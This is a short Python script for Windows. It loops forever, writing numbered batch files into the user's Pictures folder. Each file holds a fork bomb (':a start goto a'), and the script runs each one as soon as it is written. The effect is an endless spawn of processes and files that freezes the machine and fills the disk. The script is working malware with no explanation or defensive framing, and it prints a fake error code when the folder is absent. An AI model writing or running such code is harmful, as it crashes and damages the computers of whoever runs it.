import subprocess
import getpass
import os

userid ="C:\\Users\\"
username = getpass.getuser()

def CSIpictures():
    global userid
    pictures = (R"\Pictures\\")
    total = str(userid) + str(username) + str(pictures)
    if os.path.exists(total):
        x = 0
        while True:
            x = x + 1
            f = open((str(total)+str(x)+'.bat'),"w+")
            f.write("""
            :a
            start
            goto a
                """)
            f.close
            subprocess.Popen((str(total))+(str(x)+'.bat'), shell=True)
    else:
        print("Code: 43")

CSIpictures()
